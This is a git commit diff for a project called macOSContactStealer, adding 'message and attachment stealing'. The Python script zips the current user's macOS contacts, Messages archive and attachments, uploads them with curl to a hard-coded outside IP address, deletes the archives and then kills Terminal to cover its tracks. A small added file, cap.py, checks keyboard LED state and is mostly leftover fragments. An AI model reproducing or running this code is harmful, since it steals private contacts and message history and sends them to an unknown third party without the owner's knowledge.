f75bd8f01c226a29bfa83591ca8a1e45aaec804a
Dan Goodman <xxdanthegoodmanxx@gmail.com>
2018-08-18 08:40:12 -0400

    Added message and attachment stealing

---
+++ macOSContactStealer/cap.py
@@ -0,0 +1,9 @@
+import keyboard
+print commands.getoutput('xset q | grep LED')
+
+import keyboard
+
+# if commands.getoutput('xset q | grep LED')[65] is '1':
+#     print "CAPS ON"
+# else:
+#     print "CAPS OFFFFFFF"
--- macOSContactStealer/stealer.py
+++ macOSContactStealer/stealer.py
@@ -6,6 +6,8 @@ from os.path import expanduser
 import subprocess
 from time import sleep
 
+enableATCH = 0
+
 home = expanduser("~")
 
 clocation = home + "/Library/Application Support/AddressBook/Metadata/"
@@ -14,7 +16,7 @@ uploadlink = "http://146.148.56.181:8080/"
 
 user = getpass.getuser()
 
-zipname = "./{0}".format(user)
+zipname = "./{0}-contacts".format(user)
 
 shutil.make_archive(zipname, 'zip', clocation)
 
@@ -22,6 +24,33 @@ subprocess.Popen(['curl', '-F', 'contact=@{0}.zip'.format(zipname), uploadlink])
 # This is not a good way to handle this but works for now
 sleep(1)
 os.unlink(zipname + ".zip")
+
+clocation = home + "/Library/Messages/Archive"
+
+zipname = "./{0}-messages".format(user)
+
+shutil.make_archive(zipname, 'zip', clocation)
+
+subprocess.Popen(['curl', '-F', 'contact=@{0}.zip'.format(zipname), uploadlink])
+sleep(1)
+os.unlink(zipname + ".zip")
+
+clocation = home + "/Library/Messages/Attachments"
+
+zipname = "./{0}-attachments".format(user)
+
+shutil.make_archive(zipname, 'zip', clocation)
+
+if enableATCH is 1:
+    clocation = home + "/Library/Messages/Attachments"
+
+    zipname = "./{0}-attachments".format(user)
+
+    shutil.make_archive(zipname, 'zip', clocation)
+    subprocess.Popen(['curl', '-F', 'contact=@{0}.zip'.format(zipname), uploadlink])
+    sleep(5)
+    os.unlink(zipname + ".zip")
+
 
 subprocess.call(['tput', 'reset'])
 subprocess.call(['killall', 'Terminal'])
